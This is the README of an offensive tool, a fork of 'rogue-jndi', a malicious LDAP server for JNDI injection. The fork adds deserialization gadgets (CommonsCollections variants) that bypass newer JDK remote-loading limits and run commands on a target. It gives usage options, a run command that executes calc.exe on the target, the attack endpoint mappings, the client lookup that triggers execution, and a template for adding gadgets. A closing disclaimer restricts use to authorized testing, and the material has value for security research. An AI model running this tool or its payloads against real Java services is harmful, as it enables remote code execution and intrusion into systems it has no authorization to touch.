## Rogue JNDI 1.2

### Description

原工具库：[veracode-research/rogue-jndi: A malicious LDAP server for JNDI injection attacks (github.com)](https://github.com/veracode-research/rogue-jndi)

增加自定义gadget触发客户端代码执行 绕过高版本JDK远程加载限制

### Bypass 

利用LDAP返回序列化数据，触发本地Gadget，LDAP支持直接返回一个对象的序列化数据。如果Java对象的 javaSerializedData 属性值不为空，则客户端的 obj.decodeObject() 方法就会对这个字段的内容进行反序列化。

`com.sun.jndi.ldap.Obj#decodeObject`

```JAVA
if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
    ClassLoader var3 = helper.getURLClassLoader(var2);
    return deserializeObject((byte[])((byte[])var1.get()), var3);
}
```

更多绕过方式请参考：https://paper.seebug.org/942

### Supported payloads

目前利用LDAP返回序列化数据，触发本地Gadget的绕过方式支持的Gadget

* CommonsCollections2
* CommonsCollections4
* CommonsCollections5
* CommonsCollections6
* CommonsCollections7
* ...

可自定义添加，在`gadgets`包中，添加模板如下

```java
@SuppressWarnings({ "rawtypes", "unchecked" })
public class GadgetName implements ObjectPayload<T>{

    @Override
    public T getObject(String command) throws Exception {
   
        return T;
    }
}
```

其他`payload`请参考原工具库

### Usage

```
> java -jar RogueJndi-1.2.jar -h
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Usage: java -jar target/RogueJndi-1.2.jar [options]
  Options:
    -c, --command  Command to execute on the target server (default: calc.exe)
    -n, --hostname Local HTTP server hostname (required for remote 
                   classloading and websphere payloads) (default: 10.75.3.9)
    -l, --ldapPort Ldap bind port (default: 1389)
    -p, --httpPort Http bind port (default: 8000)
    --wsdl         [websphere1 payload option] WSDL file with XXE payload 
                   (default: /list.wsdl)
    --localjar     [websphere2 payload option] Local jar file to load (this 
                   file should be located on the remote server) (default: 
                   ../../../../../tmp/jar_cache7808167489549525095.tmp) 
    -g, --gadget   Use the client gadget to bypass the high-version JDK , 
                   choose the gadget to use (default: CommonsCollections6)
    -h, --help     Show this help
```

### Example

绕过高版本JDK限制：利用LDAP返回序列化数据，触发本地Gadget，如下Gadget的是`CommonsCollections6`

```
>java -jar RogueJndi-1.2.jar  -c "calc.exe" -n "127.0.0.1" -g "CommonsCollections6"
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://127.0.0.1:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://127.0.0.1:1389/o=ldapref to artsploit.controllers.LDAPRefServer
Mapping ldap://127.0.0.1:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://127.0.0.1:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://127.0.0.1:1389/o=tomcat to artsploit.controllers.Tomcat
Mapping ldap://127.0.0.1:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://127.0.0.1:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://127.0.0.1:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://127.0.0.1:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
```

客户端触发代码：

```
new InitialContext().lookup("ldap://127.0.0.1:1389/o=ldapref");
```

### Building

Java v1.7+ and Maven v3+ required

```
mvn package 
```

### Disclamer

 此工具仅用于企业安全人员自查验证自身企业资产的安全风险，或有合法授权的安全测试，请勿用于其他用途，如有，后果自负。